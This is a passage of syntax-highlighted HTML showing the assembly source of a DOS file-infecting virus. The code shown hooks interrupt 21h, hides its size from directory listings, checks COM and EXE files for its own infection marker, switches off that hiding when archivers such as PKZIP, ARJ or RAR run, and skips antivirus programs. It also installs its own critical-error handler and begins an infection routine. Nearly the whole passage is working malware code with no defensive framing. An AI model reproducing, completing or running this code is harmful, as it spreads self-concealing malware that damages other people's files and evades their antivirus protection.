  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">                      </span><span class="sc1">; terminate program?</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_prog</span><span class="sc0">                    </span><span class="sc1">; </span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore</span><span class="sc0">                     </span><span class="sc1">; all other functions execute the normal int</span><span class="sc0">



 </span><span class="sc5">exit_prog</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">exit_delta</span><span class="sc0">
 </span><span class="sc5">exit_delta</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_delta</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">archiver</span><span class="sc4">],</span><span class="sc5">off</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore</span><span class="sc0">




 </span><span class="sc5">stealth</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">popf</span><span class="sc0">                            </span><span class="sc1">; restore the flags, they don't matter here.</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                         </span><span class="sc1">; save BP (changed in the delta routine)</span><span class="sc0">

  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">stealth_delta</span><span class="sc0">              </span><span class="sc1">; well, another delta offset :]</span><span class="sc0">
 </span><span class="sc5">stealth_delta</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stealth_delta</span><span class="sc0">

  </span><span class="sc6">pushf</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_int_21h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; fake int 21h call</span><span class="sc0">

  </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; save everything (returned flags and regs!)</span><span class="sc0">
  </span><span class="sc6">pusha</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                      </span><span class="sc1">; get address of DTA in ES:BX</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; DS = ES (= DTA), so we can access the</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; filename in the dta (by using func 3Dh,..)</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                      </span><span class="sc1">; DI points to the beginning of the filename</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">; save that for later</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">                      </span><span class="sc1">; search for a dot</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">                       </span><span class="sc1">; 13 characters max</span><span class="sc0">
  </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">; forward direction</span><span class="sc0">
  </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                     </span><span class="sc1">; search while not found and cx &lt;&gt; 0</span><span class="sc0">

  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">       </span><span class="sc1">; if the extension begins with 'CO' it</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">might_be_com_exe</span><span class="sc0">             </span><span class="sc1">; 'might' be a com file</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">       </span><span class="sc1">; if the extension begins with 'EX' it</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">might_be_com_exe</span><span class="sc0">             </span><span class="sc1">; 'might' be an exe file</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; if the extension doesn't begin with</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_stealth</span><span class="sc0">                  </span><span class="sc1">; 'CO' neither with 'EX' we restore the</span><span class="sc0">
                                  </span><span class="sc1">; stack (pop di) and leave the stealth</span><span class="sc0">
                                  </span><span class="sc1">; routine.</span><span class="sc0">

 </span><span class="sc5">might_be_com_exe</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">      </span><span class="sc1">; if the last character of the extension is</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">probably_com_exe</span><span class="sc0">             </span><span class="sc1">; a 'M' the file is 'probably' a com file :)</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">      </span><span class="sc1">; blah..</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">probably_com_exe</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; if its not a com and not an exe we restore</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_stealth</span><span class="sc0">                  </span><span class="sc1">; the stack again and leave the stealth</span><span class="sc0">
                                  </span><span class="sc1">; routine.</span><span class="sc0">

 </span><span class="sc5">probably_com_exe</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; restore DX (filename)    </span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">; save BX (offset of DTA)</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">                    </span><span class="sc1">; open file at DS:DX for reading</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
  </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">no_error</span><span class="sc0">                    </span><span class="sc1">; (an error occures if the file is in</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">; another directory), if so, restore the</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_stealth</span><span class="sc0">                  </span><span class="sc1">; stack (pop bx) and leave...</span><span class="sc0">

 </span><span class="sc5">no_error</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; put the filehandle into BX</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; DS = CS</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; read</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">                      </span><span class="sc1">; 1Ch bytes</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; to 'header'</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; close the file.</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         

  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">; restore BX (offset of dta)</span><span class="sc0">


  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">  </span><span class="sc1">; if the file begins with either 'ZM'</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">check_exe</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc0">  </span><span class="sc1">; or 'MZ' it is an exe file, </span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">check_exe</span><span class="sc0">                      </span><span class="sc1">; if so it checks if the EXE file is</span><span class="sc0">
                                    </span><span class="sc1">; infected.</span><span class="sc0">

 </span><span class="sc5">check_com</span><span class="sc4">:</span><span class="sc0">                         
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">        </span><span class="sc1">; else it checks the COM file for an</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; infection. filesize goes into AX.</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">      </span><span class="sc1">; substract virussize + 3(jmp) + 7(enuns)</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; if thats equal to the jump in the header</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stealth_it</span><span class="sc0">                     </span><span class="sc1">; it is already infected and will be</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_stealth</span><span class="sc0">                    </span><span class="sc1">; stealthed... else, leave the stealth</span><span class="sc0">
                                    </span><span class="sc1">; routine.</span><span class="sc0">

 </span><span class="sc5">check_exe</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'XV'</span><span class="sc0">  </span><span class="sc1">; if it is an exe file we just check</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_stealth</span><span class="sc0">                        </span><span class="sc1">; the infection marker from the header</span><span class="sc0">
                                        </span><span class="sc1">; not infected? - leave</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

 </span><span class="sc5">stealth_it</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">archiver</span><span class="sc4">],</span><span class="sc5">on</span><span class="sc0">      </span><span class="sc1">; if an archiver is running don't</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_stealth</span><span class="sc0">                         </span><span class="sc1">; stealth it.</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; substract the virussize from</span><span class="sc0">
  </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; the filesize in the dta.</span><span class="sc0">

 </span><span class="sc5">no_stealth</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                </span><span class="sc1">; restore everything that was pushed</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                </span><span class="sc1">; before</span><span class="sc0">
  </span><span class="sc6">popa</span><span class="sc0">
  </span><span class="sc6">popf</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
  </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">; and exit the interrupt, without</span><span class="sc0">
                                        </span><span class="sc1">; poping (restoring) the flags!</span><span class="sc0">


 </span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; infect the file at DS:DX</span><span class="sc0">

  </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">; save all regs</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; save DS,</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; ES</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">; and DX (= offset of the filename)</span><span class="sc0">

  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_delta</span><span class="sc0">
 </span><span class="sc5">infect_delta</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_delta</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

  </span><span class="sc6">cld</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
  </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                 </span><span class="sc1">; search for the end (zero) of the filename</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; check for PKzip</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">                 </span><span class="sc1">; make it lower case</span><span class="sc0">
  </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'kp'</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exec_pkzip</span><span class="sc0">              

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; check for ARJ and RAR</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">
  </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ra'</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exec_arj</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ar'</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exec_rar</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_archiver</span><span class="sc0">

 </span><span class="sc5">exec_pkzip</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">'iz'</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exec_archiver</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_archiver</span><span class="sc0">

 </span><span class="sc5">exec_arj</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">'.j'</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exec_archiver</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_archiver</span><span class="sc0">

 </span><span class="sc5">exec_rar</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">'.r'</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exec_archiver</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_archiver</span><span class="sc0">
  
 </span><span class="sc5">exec_archiver</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">archiver</span><span class="sc4">],</span><span class="sc5">on</span><span class="sc0">

 </span><span class="sc5">no_archiver</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">std</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">
  </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

  </span><span class="sc6">cld</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">avs</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
  </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">                     </span><span class="sc1">; search for AV programs....</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_av</span><span class="sc0">

  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
  </span><span class="sc6">popa</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore</span><span class="sc0">

 </span><span class="sc5">no_av</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">; set a new crittical error handler (int 24h)</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; DS = AX = 0 (= Interrupt Vector Table)</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">new_int_24h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; AX = offset of the new interrupt 24h routine</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                     </span><span class="sc1">; BX = CS (= segment where the new interrupt</span><span class="sc0">
                                </span><span class="sc1">;            routine is in)</span><span class="sc0">
  </span><span class="sc6">cli</span><span class="sc0">                           </span><span class="sc1">; disable ints</span><span class="sc0">
  </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; save the old interrupt's address in BX and</span><span class="sc0">
  </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AX, and overwrite it with the new one</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_int_24h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; save AX and BX in</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_int_24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">; the virus's code</span><span class="sc0">
  </span><span class="sc6">sti</span><span class="sc0">                           </span><span class="sc1">; enable ints again</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                    </span><span class="sc1">; get attributes of filename at DS:DX</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">; save them</span><span class="sc0">

